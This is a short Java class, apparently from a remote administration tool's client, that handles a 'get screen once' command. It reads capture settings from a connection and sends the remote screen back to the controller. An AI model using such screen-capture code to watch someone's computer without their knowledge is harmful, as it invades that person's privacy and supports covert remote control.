package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.RemoteScreen;

public class PacketGETSCREENONCE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		int rows = Connection.readInt();
		int cols = Connection.readInt();
		RemoteScreen.send(true, quality, monitor, rows, cols);
	}

}
